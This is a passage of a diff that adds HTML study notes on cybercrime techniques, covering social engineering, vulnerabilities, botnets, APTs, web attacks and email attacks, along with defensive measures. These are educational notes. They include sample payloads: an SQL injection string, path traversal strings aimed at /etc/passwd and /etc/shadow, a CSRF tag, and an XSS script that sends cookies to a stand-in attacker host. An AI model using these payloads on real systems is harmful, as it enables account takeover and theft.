+      <p>Leaving a malware-infected USB drive in a target organisation's car park, reception, or cafeteria — labelled "Salary Details Q3" or "HR Confidential." Curiosity drives victims to plug it in. Works equally well as online bait: free movies, cracked software, fake prizes.</p>
+      <div class="ctg-eg">USB drops outside corporate offices — found in Pentagon and US Army cases</div>
+    </div>
+  </div>
+
+  <h3>Social Media as a Social Engineering Platform</h3>
+  <p>Social media platforms — Facebook, Instagram, LinkedIn, Twitter/X, WhatsApp — provide attackers with three key capabilities:</p>
+  <ul>
+    <li><strong>Intelligence gathering:</strong> Public profiles reveal name, photo, employer, family, location, interests, relationships — all usable in crafting convincing attacks</li>
+    <li><strong>Direct communication channel:</strong> Attackers can contact targets via DMs, friend requests from fake profiles, or by hijacking a trusted contact's compromised account</li>
+    <li><strong>Amplification:</strong> Fake news, disinformation, and scam campaigns reach millions in hours via social sharing mechanisms</li>
+  </ul>
+
+  <div class="example-box">
+    <div class="ex-label">Attack Pattern — LinkedIn Job Scam (India 2023–24)</div>
+    <strong>Step 1:</strong> Attacker creates a convincing LinkedIn profile of a "HR Manager at Infosys/TCS." <br>
+    <strong>Step 2:</strong> Sends connection request to freshers and recent graduates — accepted because profile looks genuine. <br>
+    <strong>Step 3:</strong> Messages victim with a "job offer" requiring a ₹2,000–₹5,000 "background verification fee" or "joining kit deposit." <br>
+    <strong>Step 4:</strong> Victim pays via UPI — attacker immediately blocks them. Some variants install malware via a fake "joining document." <br>
+    <strong>Losses:</strong> MHA I4C reported 1,14,000+ job-related fraud complaints in 2023 — total losses exceeding ₹900 crore.
+  </div>
+
+  <h3>Defending Against Social Engineering</h3>
+  <div class="three-grid">
+    <div class="three-card">
+      <span class="card-icon">🧠</span>
+      <h4>Awareness Training</h4>
+      <p>Regular security awareness training for all employees — simulated phishing campaigns, recognition of red flags (urgency, unusual sender, unexpected attachments, requests for credentials or payment). Studies show training reduces click rates on phishing emails by 60–80%.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">✅</span>
+      <h4>Verification Protocols</h4>
+      <p>Always independently verify identity — call back on a known number, never the one provided in the suspicious message. No legitimate bank, IT support, or government agency will ever ask for OTPs, passwords, or UPI PINs over the phone or via SMS.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔒</span>
+      <h4>Technical Controls</h4>
+      <p>Email gateway filtering, anti-phishing browser extensions, domain reputation checks, DKIM/SPF/DMARC email authentication to prevent spoofed sender addresses, and MFA on all critical accounts so stolen credentials alone are insufficient to log in.</p>
+    </div>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>Mitnick, K. &amp; Simon, W. — The Art of Deception, Wiley, 2002</li>
+      <li>Cialdini, R. — Influence: The Psychology of Persuasion, Harper Business, 2006</li>
+      <li>MHA I4C — Digital Arrest Scam Advisory: https://www.mha.gov.in</li>
+      <li>Social Engineering Framework: https://www.social-engineer.org</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.3 — EXPLOITING VULNERABILITIES
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-3">
+  <div class="topic-label">Topic 2.3</div>
+  <h2 class="topic-title">Exploiting Vulnerabilities in Software and Hardware</h2>
+
+  <div class="concept-box">
+    A <strong>vulnerability</strong> is a weakness or flaw in a system — in code, configuration, design, or hardware — that an attacker can exploit to perform unauthorised actions. <strong>Exploitation</strong> is the act of leveraging a vulnerability to gain unauthorised access, execute malicious code, escalate privileges, or exfiltrate data. Software and hardware vulnerabilities form the technical foundation of most cybercrime techniques.
+  </div>
+
+  <h3>Types of Software Vulnerabilities</h3>
+
+  <div class="crime-type-grid">
+    <div class="ctg-card cc-red">
+      <span class="ctg-icon">💉</span>
+      <h4>SQL Injection (SQLi)</h4>
+      <p>Inserting malicious SQL commands into input fields (login forms, search boxes) that are executed by the backend database. Allows attackers to bypass authentication, dump entire databases, modify or delete records, or execute system commands.</p>
+      <div class="ctg-eg">Input: <code>' OR '1'='1</code> → bypasses login without correct password</div>
+    </div>
+    <div class="ctg-card cc-amber">
+      <span class="ctg-icon">📜</span>
+      <h4>Cross-Site Scripting (XSS)</h4>
+      <p>Injecting malicious JavaScript into web pages viewed by other users. Stored XSS persists in the database; Reflected XSS is in the URL. Used to steal session cookies, redirect users to phishing sites, log keystrokes, or deface websites.</p>
+      <div class="ctg-eg">Stored XSS in a forum post: <code>&lt;script&gt;document.location='attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></div>
+    </div>
+    <div class="ctg-card cc-blue">
+      <span class="ctg-icon">🔓</span>
+      <h4>Buffer Overflow</h4>
+      <p>Writing more data into a fixed-size memory buffer than it can hold — causing adjacent memory to be overwritten. Can crash the program, corrupt data, or allow the attacker to inject and execute arbitrary code (shellcode) at elevated privilege levels.</p>
+      <div class="ctg-eg">MS08-067 (Conficker worm) · Heartbleed (CVE-2014-0160) — OpenSSL buffer over-read</div>
+    </div>
+    <div class="ctg-card cc-purple">
+      <span class="ctg-icon">📂</span>
+      <h4>Path Traversal</h4>
+      <p>Using sequences like <code>../../../etc/passwd</code> in file path inputs to access files outside the intended directory. Allows attackers to read sensitive system files, configuration files with stored credentials, or application source code.</p>
+      <div class="ctg-eg">URL: <code>https://example.com/file?path=../../etc/shadow</code></div>
+    </div>
+    <div class="ctg-card cc-green">
+      <span class="ctg-icon">🏭</span>
+      <h4>Insecure Deserialization</h4>
+      <p>Applications that deserialize (convert data from a stored format back to an object) untrusted data without validation allow attackers to inject malicious serialized objects — leading to remote code execution, privilege escalation, or denial of service.</p>
+      <div class="ctg-eg">Apache Struts RCE (CVE-2017-5638) — used in the Equifax breach exposing 147 million records</div>
+    </div>
+    <div class="ctg-card cc-dark">
+      <span class="ctg-icon">🌅</span>
+      <h4>Zero-Day Vulnerabilities</h4>
+      <p>Unknown vulnerabilities with no available patch — "zero days" of warning for defenders. Highly valuable on criminal markets — priced from $50,000 to over $1 million depending on target platform. Used in APTs, nation-state attacks, and ransomware delivery.</p>
+      <div class="ctg-eg">Log4Shell (CVE-2021-44228) — zero-day in Log4j library, affected millions of Java applications</div>
+    </div>
+  </div>
+
+  <h3>Hardware Vulnerabilities</h3>
+  <div class="two-col-grid">
+    <div class="two-col-card imp-c">
+      <span class="tc-icon">⚡</span>
+      <h4>Spectre &amp; Meltdown (CPU Flaws)</h4>
+      <p>Discovered in 2018, these vulnerabilities exist in the speculative execution design of modern CPUs (Intel, AMD, ARM). They allow malicious code running in one process to read memory from other processes — potentially exposing passwords, encryption keys, and sensitive data. Cannot be fully patched in hardware — only mitigated in software with performance penalties.</p>
+      <div class="tc-eg">CVE-2017-5753 (Spectre) · CVE-2017-5754 (Meltdown) — affect virtually all modern processors</div>
+    </div>
+    <div class="two-col-card imp-d">
+      <span class="tc-icon">📻</span>
+      <h4>Firmware Vulnerabilities</h4>
+      <p>Low-level software (firmware) running on routers, IoT devices, hard drives, and BIOS/UEFI is often never updated by users and may contain vulnerabilities that survive full OS reinstallation. Attackers can implant malware at the firmware level — nearly impossible to detect or remove without replacing hardware.</p>
+      <div class="tc-eg">NSA's "EquationDrug" firmware implant persisted through hard drive reformatting</div>
+    </div>
+    <div class="two-col-card imp-a">
+      <span class="tc-icon">🔌</span>
+      <h4>BadUSB / Malicious Peripherals</h4>
+      <p>A USB device's controller firmware can be reprogrammed to act as a keyboard — and automatically type malicious commands when plugged in. "Rubber Ducky" and similar devices used in penetration testing can exfiltrate data or install backdoors in seconds, entirely bypassing antivirus since they appear as keyboards.</p>
+      <div class="tc-eg">Rubber Ducky by Hak5 — widely available pentesting tool; misused in targeted attacks</div>
+    </div>
+    <div class="two-col-card imp-b">
+      <span class="tc-icon">📡</span>
+      <h4>Supply Chain Hardware Implants</h4>
+      <p>Malicious chips or modifications introduced during hardware manufacturing or distribution — before the device reaches the end user. The 2018 Bloomberg report alleged that Supermicro server motherboards sold to Amazon and Apple contained rice-grain-sized spy chips. Extremely difficult to detect and the most sophisticated hardware attack.</p>
+      <div class="tc-eg">SolarWinds supply chain attack (2020) — malicious code inserted into software update</div>
+    </div>
+  </div>
+
+  <div class="formula-box">CVE Score (CVSS): Base Score = f(Attack Vector, Complexity, Privileges, User Interaction, Scope, Impact)</div>
+
+  <h3>The Vulnerability Lifecycle</h3>
+  <div class="phase-strip">
+    <div class="phase-block ph-1">
+      <span class="ph-num">1</span>
+      <span class="ph-title">Discovery</span>
+      <span class="ph-desc">Vulnerability found — by researcher, vendor, or attacker. Zero-day at this point.</span>
+    </div>
+    <div class="phase-block ph-2">
+      <span class="ph-num">2</span>
+      <span class="ph-title">Disclosure</span>
+      <span class="ph-desc">Researcher reports to vendor (responsible disclosure) or publishes publicly (full disclosure).</span>
+    </div>
+    <div class="phase-block ph-3">
+      <span class="ph-num">3</span>
+      <span class="ph-title">CVE Assignment</span>
+      <span class="ph-desc">MITRE assigns CVE ID (e.g. CVE-2024-12345) — publicly catalogued in NVD.</span>
+    </div>
+    <div class="phase-block ph-4">
+      <span class="ph-num">4</span>
+      <span class="ph-title">Patch Development</span>
+      <span class="ph-desc">Vendor develops and tests security patch — typically 30–90 days from disclosure.</span>
+    </div>
+    <div class="phase-block ph-5">
+      <span class="ph-num">5</span>
+      <span class="ph-title">Patch Release</span>
+      <span class="ph-desc">Security update released to the public. Exploitation risk is now highest — attackers reverse-engineer the patch.</span>
+    </div>
+    <div class="phase-block ph-6">
+      <span class="ph-num">6</span>
+      <span class="ph-title">Patching by Users</span>
+      <span class="ph-desc">Organisations and users apply the patch — may take weeks to months. Unpatched systems remain exploitable indefinitely.</span>
+    </div>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>OWASP Top 10: https://owasp.org/www-project-top-ten/</li>
+      <li>MITRE CVE Database: https://cve.mitre.org</li>
+      <li>NIST National Vulnerability Database: https://nvd.nist.gov</li>
+      <li>Meltdown and Spectre: https://meltdownattack.com</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.4 — BOTNETS AND DDoS
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-4">
+  <div class="topic-label">Topic 2.4</div>
+  <h2 class="topic-title">Use of Botnets and Distributed Denial-of-Service (DDoS) Attacks</h2>
+
+  <div class="concept-box">
+    A <strong>Botnet</strong> is a network of internet-connected devices — computers, smartphones, IoT devices — that have been secretly compromised by malware and are controlled remotely by an attacker (the "bot herder") via a Command-and-Control (C&amp;C) server. Botnets are the infrastructure that powers DDoS attacks, spam campaigns, cryptocurrency mining, and credential stuffing. A <strong>DDoS (Distributed Denial-of-Service) attack</strong> uses this botnet army to flood a target with traffic until it collapses under the load.
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip</div>
+    Difference between <strong>DoS</strong> (one machine attacks one target) and <strong>DDoS</strong> (thousands of bot machines attack one target — much harder to block). The Mirai Botnet (2016) infected IoT devices (CCTV cameras, routers) and launched the largest DDoS in history — 1.2 Tbps — taking down Twitter, Netflix, and Amazon simultaneously. DDoS attack types: <strong>Volumetric</strong> (flood bandwidth), <strong>Protocol</strong> (exhaust server resources — SYN flood), <strong>Application Layer</strong> (HTTP flood — hardest to detect).
+  </div>
+
+  <h3>How a Botnet is Created and Operated</h3>
+  <div class="phase-strip">
+    <div class="phase-block ph-1">
+      <span class="ph-num">1</span>
+      <span class="ph-title">Infection</span>
+      <span class="ph-desc">Devices infected via phishing emails, drive-by downloads, malicious ads, or exploiting unpatched vulnerabilities.</span>
+    </div>
+    <div class="phase-block ph-2">
+      <span class="ph-num">2</span>
+      <span class="ph-title">C&amp;C Setup</span>
+      <span class="ph-desc">Bot malware connects back to a Command-and-Control server run by the attacker — receives instructions.</span>
+    </div>
+    <div class="phase-block ph-3">
+      <span class="ph-num">3</span>
+      <span class="ph-title">Propagation</span>
+      <span class="ph-desc">Bot scans for and infects other vulnerable devices autonomously — botnet grows exponentially.</span>
+    </div>
+    <div class="phase-block ph-4">
+      <span class="ph-num">4</span>
+      <span class="ph-title">Activation</span>
+      <span class="ph-desc">Bot herder sends command — all bots simultaneously execute the attack (DDoS flood, spam, mining).</span>
+    </div>
+    <div class="phase-block ph-5">
+      <span class="ph-num">5</span>
+      <span class="ph-title">Monetisation</span>
+      <span class="ph-desc">Attacker rents the botnet to others (DDoS-for-hire), uses it for crypto mining, or sells stolen data.</span>
+    </div>
+  </div>
+
+  <h3>Types of DDoS Attacks</h3>
+  <div class="two-col-grid">
+    <div class="two-col-card imp-a">
+      <span class="tc-icon">🌊</span>
+      <h4>Volumetric Attacks</h4>
+      <p>Flood the target with massive amounts of traffic — typically UDP floods or ICMP floods — consuming all available bandwidth. Measured in Gbps or Tbps. Simple but highly effective. Amplification attacks use DNS/NTP servers to multiply traffic volume by 50–100x using forged source IPs.</p>
+      <div class="tc-eg">UDP Flood · ICMP Flood · DNS Amplification · NTP Amplification</div>
+    </div>
+    <div class="two-col-card imp-b">
+      <span class="tc-icon">🤝</span>
+      <h4>Protocol Attacks (SYN Flood)</h4>
+      <p>Exploit weaknesses in network protocol implementations — the SYN flood sends thousands of TCP connection requests with spoofed IPs. The server allocates resources waiting for confirmation that never comes — exhausting the connection table and refusing legitimate users.</p>
+      <div class="tc-eg">SYN Flood · Ping of Death · Smurf Attack · Fragmentation Attacks</div>
+    </div>
+    <div class="two-col-card imp-c">
+      <span class="tc-icon">🌐</span>
+      <h4>Application Layer (L7) Attacks</h4>
+      <p>HTTP floods targeting the application layer — sending large numbers of seemingly legitimate HTTP GET/POST requests that each require significant server processing. Harder to detect because individual requests look normal. Slowloris keeps connections open indefinitely to exhaust server threads.</p>
+      <div class="tc-eg">HTTP Flood · Slowloris · RUDY (R-U-Dead-Yet) · WordPress XML-RPC flood</div>
+    </div>
+    <div class="two-col-card imp-d">
+      <span class="tc-icon">💰</span>
+      <h4>Ransom DDoS (RDDoS)</h4>
+      <p>Attackers send extortion demands threatening a devastating DDoS attack unless Bitcoin payment is made. Often demonstrate capability with a short "warning" attack first. Emerged as a significant threat to financial institutions, e-commerce platforms, and online gaming companies.</p>
+      <div class="tc-eg">Lazarus Bear Armada (LBA) — extorted banks and exchanges threatening 2 Tbps attacks</div>
+    </div>
+  </div>
+
+  <div class="warn-box">
+    <div class="warn-label">⚠️ Notable Indian DDoS Incidents</div>
+    <strong>AIIMS Delhi (Nov 2022):</strong> Ransomware combined with DDoS disrupted hospital services for 15 days — patient records of 3–4 crore people compromised. <strong>Indian Council of Medical Research (ICMR, 2022):</strong> 6,000+ hacking attempts per minute. <strong>Bombay Stock Exchange:</strong> Periodic DDoS attempts during market hours — high-impact target due to financial sensitivity of timing.
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>Cloudflare DDoS Threat Landscape Q3 2024: https://www.cloudflare.com/learning/ddos</li>
+      <li>Mirai Botnet Source Code Analysis: https://github.com/jgamblin/Mirai-Source-Code</li>
+      <li>CERT-IN Advisory on DDoS: https://www.cert-in.org.in/PDF/advisory_DDoS.pdf</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.5 — ADVANCED PERSISTENT THREATS
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-5">
+  <div class="topic-label">Topic 2.5</div>
+  <h2 class="topic-title">Advanced Persistent Threats (APTs)</h2>
+
+  <div class="concept-box">
+    An <strong>Advanced Persistent Threat (APT)</strong> is a prolonged, highly targeted cyber attack in which an attacker — typically a nation-state or state-sponsored group — gains unauthorised access to a target network and remains undetected for months or years, continuously extracting sensitive data. The three defining characteristics are: <strong>Advanced</strong> (sophisticated tools and techniques), <strong>Persistent</strong> (long-term presence, months to years), and <strong>Threat</strong> (determined human adversary with specific objectives).
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip</div>
+    APT actors: <strong>APT28 / Fancy Bear</strong> (Russia · GRU), <strong>APT29 / Cozy Bear</strong> (Russia · SVR), <strong>APT41</strong> (China · state-sponsored), <strong>Lazarus Group</strong> (North Korea · financially motivated), <strong>OilRig</strong> (Iran). APTs use the <strong>Cyber Kill Chain</strong> (Lockheed Martin model — 7 stages). Unlike regular cybercrime, APT objective is intelligence gathering, sabotage, or long-term financial theft — not quick one-time attacks.
+  </div>
+
+  <h3>APT Kill Chain — 7 Stages</h3>
+  <div class="apt-chain">
+    <div class="apt-step apt-1">
+      <span class="apt-num">1</span>
+      <span class="apt-name">Reconnaissance</span>
+      <span class="apt-desc">OSINT, social media analysis, spear-phishing target identification, scanning infrastructure</span>
+    </div>
+    <div class="apt-step apt-2">
+      <span class="apt-num">2</span>
+      <span class="apt-name">Weaponisation</span>
+      <span class="apt-desc">Create weaponised payload — malware embedded in Word doc / PDF / link tailored to target</span>
+    </div>
+    <div class="apt-step apt-3">
+      <span class="apt-num">3</span>
+      <span class="apt-name">Delivery</span>
+      <span class="apt-desc">Spear-phishing email, watering hole attack, compromised supply chain, USB drop</span>
+    </div>
+    <div class="apt-step apt-4">
+      <span class="apt-num">4</span>
+      <span class="apt-name">Exploitation</span>
+      <span class="apt-desc">Exploit zero-day or known vulnerability to execute malware on target system</span>
+    </div>
+    <div class="apt-step apt-5">
+      <span class="apt-num">5</span>
+      <span class="apt-name">Installation</span>
+      <span class="apt-desc">Install backdoor / RAT (Remote Access Trojan) — establish persistent access that survives reboots</span>
+    </div>
+    <div class="apt-step apt-6">
+      <span class="apt-num">6</span>
+      <span class="apt-name">C&amp;C</span>
+      <span class="apt-desc">Establish encrypted covert Command &amp; Control channel — beacon out to attacker infrastructure</span>
+    </div>
+    <div class="apt-step apt-7">
+      <span class="apt-num">7</span>
+      <span class="apt-name">Exfiltration</span>
+      <span class="apt-desc">Move laterally, escalate privileges, collect and quietly exfiltrate target data over months</span>
+    </div>
+  </div>
+
+  <h3>Characteristics That Distinguish APTs from Regular Attacks</h3>
+  <table class="data-table no-bold">
+    <thead><tr><th>Characteristic</th><th>Regular Cybercrime</th><th>APT</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Duration</strong></td><td>Hours to days — hit and run</td><td>Months to years — persistent presence</td></tr>
+      <tr><td><strong>Target Selection</strong></td><td>Opportunistic — weakest available target</td><td>Highly specific — selected for strategic value (government, defence, critical infrastructure)</td></tr>
+      <tr><td><strong>Stealth</strong></td><td>Not priority — ransomware announces itself</td><td>Primary objective — evade all detection throughout operation duration</td></tr>
+      <tr><td><strong>Objective</strong></td><td>Quick financial gain, disruption</td><td>Intelligence collection, IP theft, long-term sabotage capability, strategic advantage</td></tr>
+      <tr><td><strong>Actors</strong></td><td>Criminal individuals/groups</td><td>Nation-states, state-sponsored groups, well-funded organised units</td></tr>
+      <tr><td><strong>Resources</strong></td><td>Commercially available tools (crimeware kits)</td><td>Custom zero-day exploits, proprietary malware, large well-funded teams</td></tr>
+    </tbody>
+  </table>
+
+  <div class="example-box">
+    <div class="ex-label">Landmark APT Case — Operation ShadowHammer (ASUS, 2019)</div>
+    <strong>Actor:</strong> APT41 (China-linked). <strong>Method:</strong> Compromised ASUS's software update server — malware was digitally signed with ASUS's legitimate certificate and pushed to ~1 million ASUS users via official updates. Only ~600 specific MAC addresses were targeted for second-stage payload. <strong>Discovery:</strong> Kaspersky Lab found the backdoor months after deployment. <strong>Lesson:</strong> Even legitimate, digitally-signed software updates from trusted vendors cannot be implicitly trusted — supply chain is an APT vector.
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>MITRE ATT&amp;CK Framework (APT TTPs): https://attack.mitre.org</li>
+      <li>Mandiant APT Reports: https://www.mandiant.com/resources/apt-groups</li>
+      <li>Lockheed Martin Cyber Kill Chain: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.6 — WEB ATTACKS
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-6">
+  <div class="topic-label">Topic 2.6</div>
+  <h2 class="topic-title">Web Attacks: Browser Attacks &amp; Web Attacks Targeting Users</h2>
+
+  <div class="concept-box">
+    Web attacks exploit vulnerabilities in browsers, web applications, and the protocols that connect them — to compromise users or servers. They are the most prevalent category of attacks because the web browser is now the primary interface for banking, commerce, communication, and work — making it the highest-value target for cybercriminals.
+  </div>
+
+  <h3>Browser-Based Attacks</h3>
+
+  <div class="crime-type-grid">
+    <div class="ctg-card cc-red">
+      <span class="ctg-icon">🚗</span>
+      <h4>Drive-by Download</h4>
+      <p>Malware automatically downloaded and installed when a user merely visits a compromised or malicious website — without any clicking or confirmation. Exploits browser vulnerabilities (JavaScript engine, PDF plugin, media player). User sees nothing unusual; infection is completely silent.</p>
+      <div class="ctg-eg">Visiting a fake news article that secretly exploits a Chrome zero-day to install spyware</div>
+    </div>
+    <div class="ctg-card cc-amber">
+      <span class="ctg-icon">🔗</span>
+      <h4>Malvertising</h4>
+      <p>Injecting malicious code into legitimate online advertising networks — the malicious ad appears on reputable, high-traffic websites (news portals, government sites). Users are infected simply by viewing the page, even without clicking the ad. Hard to defend against as the malicious code comes from trusted ad networks.</p>
+      <div class="ctg-eg">Major Indian news portals have unknowingly served malvertising — affecting lakhs of readers</div>
+    </div>
+    <div class="ctg-card cc-blue">
+      <span class="ctg-icon">🍪</span>
+      <h4>Session Hijacking (Cookie Theft)</h4>
+      <p>Stealing a user's authenticated session cookie — typically via XSS attacks, network sniffing on unencrypted connections, or malware — allows the attacker to impersonate the victim on any website where they are logged in, without needing their password. Bypasses MFA entirely as the session is already authenticated.</p>
+      <div class="ctg-eg">Attacker steals Gmail session cookie → accesses entire Google account without password</div>
+    </div>
+    <div class="ctg-card cc-purple">
+      <span class="ctg-icon">🧩</span>
+      <h4>Browser Extension Malware</h4>
+      <p>Malicious browser extensions appear as useful utilities (PDF converters, ad blockers, currency converters) but secretly steal passwords, redirect searches, inject ads, read all visited pages, or access banking sessions. Available even on Chrome Web Store and Firefox Add-ons — poorly moderated.</p>
+      <div class="ctg-eg">DataSpii extension — secretly exfiltrated browsing history of 4 million users including healthcare and legal data</div>
+    </div>
+    <div class="ctg-card cc-green">
+      <span class="ctg-icon">🕳️</span>
+      <h4>Clickjacking (UI Redressing)</h4>
+      <p>Overlaying an invisible malicious iframe over a visible legitimate button — when the user thinks they're clicking "Play Video," they're actually clicking "Confirm Bank Transfer." Used to trick users into enabling camera/microphone, following attackers on social media, or approving financial transactions.</p>
+      <div class="ctg-eg">Invisible Facebook "Like" button placed over a video play button — like campaign manipulation</div>
+    </div>
+    <div class="ctg-card cc-dark">
+      <span class="ctg-icon">🔀</span>
+      <h4>Man-in-the-Browser (MitB)</h4>
+      <p>Malware (Zeus, SpyEye) sits inside the browser as a plugin and intercepts all communication between the user and websites — in real-time. When the user logs into internet banking and initiates a transfer, the MitB malware silently changes the destination account and amount — the victim sees the correct transaction on screen while a different one is processed.</p>
+      <div class="ctg-eg">Zeus malware — stole over $100 million from US banks using MitB before takedown in 2010</div>
+    </div>
+  </div>
+
+  <h3>Web Attacks Targeting Users</h3>
+
+  <div class="two-col-grid">
+    <div class="two-col-card imp-a">
+      <span class="tc-icon">🔄</span>
+      <h4>Cross-Site Request Forgery (CSRF)</h4>
+      <p>Tricks a logged-in user's browser into sending an authenticated request to a web application without the user's knowledge. If a user is logged into their bank and visits a malicious site, hidden HTML can force a money transfer request that the bank's server accepts as legitimate (since it carries the user's valid session cookie).</p>
+      <div class="tc-eg">Hidden form: <code>&lt;img src="bank.com/transfer?to=attacker&amp;amount=50000"&gt;</code></div>
+    </div>
+    <div class="two-col-card imp-b">
+      <span class="tc-icon">🌐</span>
+      <h4>DNS Spoofing / DNS Cache Poisoning</h4>
+      <p>Corrupting a DNS server's cache to resolve a legitimate domain (e.g. hdfc.com) to the attacker's IP address — redirecting all visitors to a fake phishing site while the browser's address bar still shows the correct legitimate URL. Victims see no warning and enter credentials on the fake site.</p>
+      <div class="tc-eg">Kaminsky Attack (2008) — demonstrated practical DNS cache poisoning against any nameserver</div>
+    </div>
+    <div class="two-col-card imp-c">
+      <span class="tc-icon">🧑‍💻</span>
+      <h4>Watering Hole Attack</h4>
+      <p>Attacker identifies websites frequently visited by the target group (e.g. an industry forum visited by defence engineers) and compromises that site — injecting malware that infects all visitors. Like a predator poisoning a watering hole. Used by APTs to target specific industries without direct contact with the target organisation.</p>
+      <div class="tc-eg">APT32 (Vietnam) compromised Vietnamese government websites to infect visiting civil servants</div>
+    </div>
+    <div class="two-col-card imp-d">
+      <span class="tc-icon">🔒</span>
+      <h4>SSL Stripping (HTTPS Downgrade)</h4>
+      <p>In a Man-in-the-Middle position, the attacker intercepts the user's initial HTTP request and establishes HTTPS connection with the bank on their behalf — presenting plain HTTP to the victim. The victim's browser shows HTTP (no padlock) but they often don't notice. All credentials are captured in plaintext by the attacker.</p>
+      <div class="tc-eg">Tool: SSLstrip by Moxie Marlinspike — demonstrated at Black Hat 2009</div>
+    </div>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>OWASP Top 10 Web Application Risks: https://owasp.org/www-project-top-ten/</li>
+      <li>PortSwigger Web Security Academy: https://portswigger.net/web-security</li>
+      <li>Google Project Zero (browser vulnerabilities): https://googleprojectzero.blogspot.com</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.7 — USER/WEBSITE DATA & EMAIL ATTACKS
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-7">
+  <div class="topic-label">Topic 2.7</div>
+  <h2 class="topic-title">Obtaining User or Website Data &amp; Email Attacks</h2>
+
+  <div class="concept-box">
+    This topic covers the techniques attackers use to harvest user credentials and sensitive website data — through database attacks, credential stuffing, and data breaches — and the distinct category of <strong>email-based attacks</strong>, which remain the primary delivery vector for cybercrime globally. Over 90% of all cyberattacks begin with a malicious email.
+  </div>
+
+  <h3>Methods of Obtaining User &amp; Website Data</h3>
+
+  <div class="crime-type-grid">
+    <div class="ctg-card cc-red">
+      <span class="ctg-icon">🗃️</span>
+      <h4>Database Breaches (SQL Injection)</h4>
+      <p>The most common method of mass data theft — exploiting SQL injection vulnerabilities in web applications to dump entire user databases containing usernames, hashed passwords, email addresses, phone numbers, and payment data. Stolen databases are sold on dark web marketplaces.</p>
+      <div class="ctg-eg">2021: MobiKwik breach — 3.5 million users' KYC data including Aadhaar numbers sold on dark web</div>
+    </div>
+    <div class="ctg-card cc-amber">
+      <span class="ctg-icon">🔑</span>
+      <h4>Credential Stuffing</h4>
+      <p>Using lists of username/password combinations from previous data breaches (available on dark web) and automatically testing them against hundreds of other services — exploiting people's habit of reusing the same password everywhere. Completely automated using tools like Sentry MBA, Snipr, or custom scripts.</p>
+      <div class="ctg-eg">If your Zomato password is the same as your HDFC net banking password — a Zomato breach compromises your bank account</div>
+    </div>
+    <div class="ctg-card cc-blue">
+      <span class="ctg-icon">⌨️</span>
+      <h4>Keylogging</h4>
+      <p>Malware that records every keystroke — capturing passwords, credit card numbers, personal messages, and search queries as they are typed. Software keyloggers are delivered via malware; hardware keyloggers are physical devices plugged between keyboard and computer (used in ATM skimming and cybercafé attacks).</p>
+      <div class="ctg-eg">Keyloggers found installed on cybercafé computers targeting bank logins across India</div>
+    </div>
+    <div class="ctg-card cc-purple">
+      <span class="ctg-icon">🌐</span>
+      <h4>Web Scraping for PII</h4>
+      <p>Automated extraction of personal information from websites, social media profiles, company directories, and public databases — at scale. While some scraping is legal, scraping personal data without consent violates DPDPA 2023 and is used for building target lists for phishing, identity theft, and spam campaigns.</p>
+      <div class="ctg-eg">LinkedIn scraping of 500 million profiles (April 2021) — data sold on hacker forums</div>
+    </div>
+    <div class="ctg-card cc-green">
+      <span class="ctg-icon">🎭</span>
+      <h4>Phishing for Credentials</h4>
+      <p>Creating pixel-perfect replicas of login pages (SBI, Gmail, PayTM) on lookalike domains (sbionline.net, gmail-verify.com) and directing victims there via phishing emails, SMS, or social media. When victims enter credentials on the fake site, they are captured and immediately tested by the attacker.</p>
+      <div class="ctg-eg">Evilginx2 — adversary-in-the-middle phishing tool that steals session tokens, bypassing MFA</div>
+    </div>
+    <div class="ctg-card cc-dark">
+      <span class="ctg-icon">📸</span>
+      <h4>Formjacking</h4>
+      <p>Injecting malicious JavaScript into e-commerce checkout pages that silently copies payment card details as customers fill out the form — transmitted to the attacker in real time while the legitimate transaction also proceeds normally. The Magecart group's signature technique — attacked British Airways, Ticketmaster, and hundreds of Indian e-commerce sites.</p>
+      <div class="ctg-eg">Magecart — stole 380,000 British Airways customers' card details over 15 days in 2018</div>
+    </div>
+  </div>
+
+  <h3>Email Attacks</h3>
+
+  <div class="two-col-grid">
+    <div class="two-col-card imp-a">
+      <span class="tc-icon">👔</span>
+      <h4>Business Email Compromise (BEC)</h4>
+      <p>Attacker impersonates a CEO, CFO, or vendor via spoofed or compromised email — instructing the finance department to urgently transfer funds to a fraudulent account. The most financially devastating email attack: FBI reported $2.7 billion in BEC losses in 2022 globally. India: ₹500+ crore in BEC fraud annually.</p>
+      <div class="tc-eg">Email from fake "CEO": "Wire ₹50 lakh to our new vendor account immediately — confidential deal, don't discuss with anyone"</div>
+    </div>
+    <div class="two-col-card imp-b">
+      <span class="tc-icon">📎</span>
+      <h4>Malicious Attachment Attacks</h4>
+      <p>Emails carrying malware-infected attachments — macro-enabled Word/Excel documents ("Enable macros to view this salary slip"), PDF exploits, JavaScript files, or executable files masquerading as invoices or shipping notifications. The most common ransomware delivery mechanism.</p>
